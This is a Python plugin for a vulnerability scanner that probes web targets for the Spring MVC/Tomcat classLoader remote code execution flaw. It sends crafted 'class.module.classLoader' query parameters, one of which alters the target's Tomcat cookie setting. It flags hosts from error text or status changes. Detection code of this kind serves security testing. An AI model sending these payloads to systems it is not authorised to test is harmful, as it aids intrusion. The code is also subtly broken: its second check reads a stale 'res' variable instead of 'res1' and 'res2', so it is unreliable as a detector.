#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    SpringMVCTomcatRCE扫描
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB
        self.poc_map = {
            "&class.module.class.module.class.module.class.module.classLoader.xx=xxx": "[java.lang.ClassLoader]",
            "&class.module.classLoader.URLs[a0]=": "org.springframework.validation.DataBinder",
        }

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    path = path + '?' if "?" not in path else path
                    for poc, keyword in self.poc_map.items():
                        try:
                            url = path + poc
                            async with session.get(url=url) as res:
                                if res:
                                    text = await res.text()
                                    if keyword in text:
                                        yield url
                                        return
                        except:
                            pass

                    try:
                        status1 = status2 = 0
                        url1 = path + "class.module.classLoader.resources.context.cookieProcessor.sameSiteCookies=unset"
                        url2 = path + "class.module.classLoader.resources.context.cookieProcessor.sameSiteCookies=unset1"
                        async with session.get(url=url1) as res1:
                            if res1:
                                status1 = res.status

                        async with session.get(url=url2) as res2:
                            if res2:
                                status2 = res.status

                        if status1 != status2 and status1 != 0 and status2 != 0:
                            yield url1
                    except:
                        pass
